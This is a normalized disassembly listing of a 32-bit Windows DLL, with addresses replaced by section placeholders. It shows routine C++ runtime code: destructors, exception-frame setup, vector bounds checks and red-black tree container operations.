sub_10001000
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10001070
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10012864
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100010a0
push ebp
mov ebp esp
mov eax [ ecx + 0x4 ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
sub edx ecx
sar edx 0x2
cmp eax edx
jb r-xdata
mov eax [ ecx + eax * 4 ]
pop ebp
retn 0x4
xor eax eax
pop ebp
retn 0x4
sub_100010e0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c258
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_10001140
sub_10001140
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c228
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov esi [ edi ]
mov ebx [ edi + 0x4 ]
cmp esi ebx
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
xor eax eax
push edi
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
call sub_10012c4b
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push eax
call sub_10012c4b
add esp 0x4
add esi 0x4
cmp esi ebx
jne r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
sub_10001220
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c8d0
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x10
mov [ edi ] r--data
call sub_10012ca7
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
jmp r-xdata
xor eax eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
jmp r-xdata
mov [ edi + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x1
push 0xc
mov [ edi ] r--data
mov [ edi + 0x8 ] eax
call sub_10012ca7
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
mov [ eax ] r--data
jmp r-xdata
mov esi [ edi + 0x4 ]
push eax
call sub_10004e90
push 0xc
call sub_10012ca7
add esp 0x4
cmp eax ebx
je r-xdata
mov esi [ edi + 0x4 ]
push eax
call sub_10004e90
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_100012f0
push ebp
mov ebp esp
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x0
mov ecx esi
call edx
cmp [ ebp + 0x8 ] eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
mov ecx esi
call edx
xor eax eax
pop ebp
retn 0x4
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
pop ebp
retn 0x4
sub_10001330
push ebp
mov ebp esp
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x0
mov ecx esi
call edx
cmp [ ebp + 0xc ] eax
jne r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0x8 ]
push 0x1
mov ecx esi
call edx
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov edx [ eax ]
mov edx [ edx + 0x4 ]
push ecx
mov ecx eax
call edx
sub_10001380
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100013d0
push ebp
mov ebp esp
push ecx
mov eax [ ebx + 0x4 ]
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov eax [ ebx + 0x4 ]
mov edi [ eax + 0x4 ]
cmp [ edi + 0x11 ] 0x0
mov esi edi
jne r-xdata
mov ecx [ ebx + 0x10 ]
mov edi [ esi + 0xc ]
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
push edi
call edx
mov eax [ edi ]
mov edx [ eax ]
mov ecx edi
call edx
cmp [ esi + 0x11 ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ ebx + 0x4 ]
mov [ eax ] eax
mov eax [ ebx + 0x4 ]
pop edi
mov [ eax + 0x8 ] eax
mov [ ebx + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
jmp r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
push ecx
mov ecx ebx
call sub_10001c60
mov esi [ esi ]
push edi
call sub_10012c4b
add esp 0x4
cmp [ esi + 0x11 ] 0x0
mov edi esi
je r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov esi eax
cmp esi [ eax + 0x8 ]
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
jmp r-xdata
sub_10001490
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ eax + 0x4 ]
push edi
mov edi [ ebx ]
cmp edi ebx
je r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push esi
cmp edi ebx
jne r-xdata
mov eax [ edi + 0x8 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov ecx [ edi + 0xc ]
mov esi [ ebp + 0x8 ]
lea edx [ ebp - 0x4 ]
push edx
mov [ ebp - 0x4 ] ecx
call sub_10002350
push eax
mov eax esi
push eax
lea esi [ ebp - 0xc ]
call sub_10005630
cmp [ edi + 0x11 ] 0x0
jne r-xdata
pop esi
mov eax [ edi + 0x4 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov edi eax
mov eax [ edi ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov edi eax
cmp edi [ eax + 0x8 ]
jne r-xdata
lea esp [ esp ]
mov edi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
mov edi eax
mov eax [ edi ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
jmp r-xdata
sub_10001520
push ebp
mov ebp esp
sub esp 0x8
push edi
mov edi eax
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] ebx
cmp ecx eax
jae r-xdata
cmp eax [ esi + 0x8 ]
jne r-xdata
mov ecx [ esi ]
lea edx [ ebp - 0x8 ]
cmp ecx edx
ja r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_10001cb0
mov edi edx
sub edi ecx
sar edi 0x3
cmp eax [ esi + 0x8 ]
jne r-xdata
add [ esi + 0x4 ] 0x8
pop edi
mov esp ebp
pop ebp
retn
mov [ eax ] edi
mov [ eax + 0x4 ] ebx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_10001cb0
mov eax [ esi ]
mov edx [ eax + edi * 8 ]
mov [ ecx ] edx
mov eax [ eax + edi * 8 + 0x4 ]
mov [ ecx + 0x4 ] eax
add [ esi + 0x4 ] 0x8
pop edi
mov esp ebp
pop ebp
retn
sub_100015a0
mov eax [ edi + 0x4 ]
push esi
mov esi [ edi ]
mov ecx eax
sub ecx esi
test ecx 0xfffffff8
je r-xdata
pop esi
retn
cmp esi eax
je r-xdata
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
cmp ecx edx
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax edx
cmp edx edx
je r-xdata
add esi 0x8
cmp esi [ edi + 0x4 ]
jne r-xdata
mov edx [ ecx ]
mov eax [ esi + 0x4 ]
mov edx [ edx + 0x4 ]
push eax
call edx
mov [ edi + 0x4 ] ecx
mov edi edi
mov esi [ eax ]
mov [ ecx ] esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
sub_10001600
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c623
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x14
mov [ edi ] r--data
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
xor esi esi
push 0x14
mov [ esi + 0x8 ] ebx
call sub_10012ca7
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
jmp r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] ebx
call sub_10012808
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_10013848
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x10 ] 0x1
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x11 ] 0x1
mov [ esi + 0x10 ] edi
jmp r-xdata
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] ebx
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] bl
push 0x10
mov [ edi + 0x4 ] esi
call sub_10012ca7
add esp 0x4
cmp eax ebx
je r-xdata
sub_100016f0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10001950
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10001720
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c5eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x10
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
push 0x14
mov [ esi + 0x8 ] 0x0
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x10 ] 0x0
call sub_10012808
push r--data
lea ecx [ ebp - 0x20 ]
push ecx
mov [ ebp - 0x20 ] r--data
call sub_10013848
mov [ esi + 0x4 ] eax
mov [ eax ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ eax + 0x8 ] eax
mov ecx [ esi + 0x4 ]
mov al 0x1
mov [ ecx + 0x10 ] al
mov edx [ esi + 0x4 ]
mov [ edx + 0x11 ] al
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push esi
push edx
mov [ ebp - 0x4 ] 0xffffffff
call sub_10001810
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10001810
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
lea eax [ ebp + 0x8 ]
push eax
mov esi edi
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] ebx
call sub_10002350
push eax
push edi
lea esi [ ebp - 0xc ]
call sub_10005630
mov edx [ ebx ]
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
xor esi esi
mov [ ebp - 0x8 ] eax
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea esp [ esp ]
inc esi
cmp esi [ ebp - 0x8 ]
jb r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0xc ]
call eax
test eax eax
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x8 ]
push esi
mov ecx ebx
call eax
test eax eax
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
mov edx [ edi + 0x4 ]
mov ecx [ edx + 0x4 ]
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
mov ecx [ edi + 0x4 ]
mov [ ebp + 0x8 ] edx
cmp edx ecx
je r-xdata
cmp [ ecx + 0xc ] eax
jae r-xdata
mov [ ebp + 0xc ] ecx
lea edx [ ebp + 0xc ]
cmp eax [ edx + 0xc ]
jb r-xdata
mov edx ecx
mov ecx [ ecx ]
mov ecx [ ecx + 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push edi
push eax
call sub_10001810
lea edx [ ebp + 0x8 ]
jmp r-xdata
cmp [ ecx + 0x11 ] 0x0
je r-xdata
cmp [ edx ] ecx
jne r-xdata
sub_100018d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c898
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10001720
mov ecx [ esi + 0x4 ]
push ecx
mov edi eax
call sub_10001490
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x10 ]
mov eax edi
call sub_10001d00
mov edx [ edi + 0x4 ]
push edx
call sub_10012c4b
push edi
call sub_10012c4b
add esp 0x8
sub_10001950
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c5c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x10 ] ebx
mov [ ebx ] r--data
mov [ ebp - 0x4 ] 0x0
mov esi [ ebx + 0x8 ]
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] edi
test edi edi
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov [ ebx ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp - 0x18 ]
mov eax edi
call sub_10001d00
mov eax [ edi + 0x4 ]
push eax
call sub_10012c4b
push edi
call sub_10012c4b
add esp 0x8
xor eax eax
push esi
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
call sub_10012c4b
add esp 0x4
push eax
call sub_10012c4b
add esp 0x4
sub_10001a10
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ecx esi
call edx
mov [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
mov [ eax + 0x8 ] 0x0
sub_10001a60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0xc ]
mov ebx ecx
mov ecx edi
call edx
xor esi esi
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
lea ecx [ ecx ]
mov eax [ edi ]
mov edx [ eax + 0x8 ]
push esi
mov ecx edi
call edx
mov edx [ ebx ]
push eax
mov eax [ edx + 0x10 ]
mov ecx ebx
call eax
inc esi
cmp esi [ ebp + 0x8 ]
jb r-xdata
sub_10001ab0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c898
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
call sub_10001720
mov edi eax
mov ebx [ edi + 0x4 ]
mov esi [ ebx ]
cmp esi ebx
je r-xdata
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] 0x0
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
push eax
push ecx
lea esi [ ebp + 0xc ]
mov eax edi
call sub_10001d00
mov eax [ edi + 0x4 ]
push eax
call sub_10012c4b
push edi
call sub_10012c4b
add esp 0x8
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ebx [ ebx ]
cmp esi ebx
jne r-xdata
mov eax [ esi + 0x8 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov edx [ edx + 0x28 ]
push eax
call edx
cmp [ esi + 0x11 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov esi eax
lea esp [ esp ]
mov esi eax
mov eax [ esi ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
mov esi eax
mov eax [ eax + 0x4 ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
jmp r-xdata
cmp esi [ eax + 0x8 ]
jne r-xdata
sub_10001ba0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
mov edx [ eax + 0xc ]
mov [ ebp - 0x4 ] ecx
push edi
mov ecx ebx
call edx
xor edi edi
mov [ ebp + 0x8 ] eax
test eax eax
je r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
nop
inc edi
cmp edi [ ebp + 0x8 ]
jb r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x8 ]
call eax
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x8 ]
push edi
mov ecx ebx
call edx
mov esi eax
mov eax [ esi ]
mov edx [ eax + 0xc ]
mov ecx esi
call edx
test eax eax
je r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov eax [ edx + 0x10 ]
push esi
call eax
sub_10001c10
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x11 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_10001c60
mov esi [ esi ]
push ebx
call sub_10012c4b
add esp 0x4
cmp [ esi + 0x11 ] 0x0
mov ebx esi
je r-xdata
sub_10001c60
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi + 0x11 ] 0x0
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_10001c60
mov esi [ esi ]
push edi
call sub_10012c4b
add esp 0x4
cmp [ esi + 0x11 ] 0x0
mov edi esi
je r-xdata
sub_10001cb0
mov eax [ ecx + 0x4 ]
push esi
mov esi [ ecx ]
sub eax esi
sar eax 0x3
cmp eax 0x1ffffffe
jbe r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
inc eax
sar edx 0x3
cmp eax edx
jbe r-xdata
push r--data
call sub_100126ab
pop esi
retn
push edi
mov esi edx
shr esi 0x1
mov edi 0x1fffffff
sub edi esi
cmp edi edx
pop edi
jae r-xdata
add edx esi
xor edx edx
jmp r-xdata
push edx
call sub_10001da0
mov edx eax
cmp edx eax
jae r-xdata
sub_10001d00
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push edi
mov edi eax
mov eax [ edi + 0x4 ]
cmp ecx [ eax ]
jne r-xdata
cmp ecx edx
je r-xdata
cmp edx eax
jne r-xdata
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ ecx + 0x11 ] 0x0
mov edx ecx
jne r-xdata
call sub_10001c10
mov eax [ edi + 0x4 ]
mov ecx [ eax ]
mov eax esi
mov [ esi ] ecx
pop edi
mov esp ebp
pop ebp
retn 0x8
push edx
lea edx [ ebp - 0x4 ]
push edx
push edi
call sub_10001e70
mov ecx [ ebp + 0x8 ]
cmp ecx [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x8 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x11 ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] eax
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov [ ebp + 0x8 ] ecx
jmp r-xdata
lea esp [ esp ]
mov ecx eax
mov [ ebp + 0x8 ] ecx
mov eax [ eax + 0x4 ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
sub_10001da0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c200
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0x1fffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x3
cmp eax ecx
jae r-xdata
push r--data
call sub_100126ab
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_100020d0
mov ebx eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push eax
mov eax ebx
mov [ ebp - 0x14 ] ebx
call sub_100023c0
mov eax [ esi ]
mov edi [ esi + 0x4 ]
sub edi eax
add esp 0x4
sar edi 0x3
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea edx [ ebx + ecx * 8 ]
lea eax [ ebx + edi * 8 ]
mov [ esi + 0x8 ] edx
mov [ esi + 0x4 ] eax
mov [ esi ] ebx
push eax
call sub_10012c4b
add esp 0x4
sub_10001e70
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
sub esp 0x8
cmp [ eax + 0x11 ] 0x0
je r-xdata
push ebx
push esi
mov ebx eax
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ebx
call sub_100054a0
mov ecx [ ebx ]
cmp [ ecx + 0x11 ] 0x0
je r-xdata
push r--data
call sub_100126f8
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
mov edi [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov edi [ eax + 0x8 ]
cmp eax ebx
jne r-xdata
mov edi ecx
jmp r-xdata
cmp [ edi + 0x11 ] 0x0
mov esi [ ebx + 0x4 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov ecx [ ebx ]
mov [ eax ] ecx
cmp eax [ ebx + 0x8 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ edi + 0x4 ] esi
cmp [ edi + 0x11 ] 0x0
mov esi [ eax + 0x4 ]
jne r-xdata
mov esi eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi ] edi
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] eax
mov [ edi + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
cmp [ ecx + 0x4 ] ebx
jne r-xdata
mov [ esi + 0x8 ] edi
mov [ esi ] edi
jmp r-xdata
mov eax [ edx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov ecx [ ebx + 0x4 ]
cmp [ ecx ] ebx
jne r-xdata
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x8 ] ecx
cmp [ ecx + 0x8 ] ebx
jne r-xdata
cmp [ edi + 0x11 ] 0x0
je r-xdata
mov [ ecx + 0x8 ] eax
mov [ ecx ] eax
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov dl [ ebx + 0x10 ]
mov cl [ eax + 0x10 ]
mov [ eax + 0x10 ] dl
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x10 ] cl
mov eax [ ebp - 0x4 ]
mov bl 0x1
cmp [ eax + 0x10 ] bl
jne r-xdata
cmp [ edi + 0x11 ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax + 0x11 ] 0x0
mov ecx edi
jne r-xdata
mov ecx esi
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_10012c4b
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
add esp 0x4
pop edi
pop esi
pop ebx
test eax eax
je r-xdata
mov ecx [ edx + 0x4 ]
cmp edi [ ecx + 0x4 ]
je r-xdata
mov eax edi
call sub_10005610
mov ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ ecx + 0x8 ] eax
jmp r-xdata
mov eax [ edx + 0x4 ]
mov [ eax ] ecx
nop
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov esp ebp
pop ebp
retn 0xc
dec eax
mov [ ecx + 0x8 ] eax
mov [ edi + 0x10 ] bl
cmp [ edi + 0x10 ] bl
jne r-xdata
mov ecx eax
mov eax [ ecx ]
cmp [ eax + 0x11 ] 0x0
je r-xdata
mov ecx [ esi ]
cmp edi ecx
jne r-xdata
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov ecx [ esi + 0x8 ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
mov [ ecx + 0x10 ] bl
push edx
mov ecx esi
mov [ esi + 0x10 ] 0x0
call sub_100055b0
mov ecx [ esi ]
mov edx [ ebp + 0x8 ]
cmp [ ecx + 0x11 ] 0x0
jne r-xdata
mov [ ecx + 0x10 ] bl
push edx
mov ecx esi
mov [ esi + 0x10 ] 0x0
call sub_10005550
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
mov edi esi
mov esi [ esi + 0x4 ]
cmp edi [ ecx + 0x4 ]
jne r-xdata
